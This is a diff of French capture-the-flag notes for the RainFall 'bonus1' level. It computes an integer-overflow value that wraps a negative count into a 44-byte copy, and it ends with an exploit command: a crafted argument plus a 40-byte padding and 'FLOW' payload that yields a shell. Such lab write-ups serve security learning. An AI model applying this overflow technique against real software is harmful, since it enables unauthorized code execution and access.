@@ -43,18 +43,21 @@ valeur hex = 1 0000 002c
 4294967336 / 4 = 1073741835
 
 -1073741835 * 4 int -> -44 
-donc non fonctionnel
+(-1073741835 + 22) * 4 int -> 44
+-1073741813 * 4 int -> 44
+
 --
 Si x = 2
 
 valeur hex = 2 0000 002c
-2 0000 002c dec -> 8589934632
-8589934632 / 4 =2147483659
+2 0000 002c dec -> 8589934636
+8589934636 / 4 = 2147483659
 
--2147483658 * 4 int -> 44
+-2147483659 * 4 int -> -44
+(-2147483659 + 22) * 4 int -> 44
+-2147483637 * 4 int -> 44
 
-
-
+Il reste simplement a mettre la valeur attendu par le if dans la variable 'nb' avec 40 caracteres d'offset.
 
 bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
 $ id
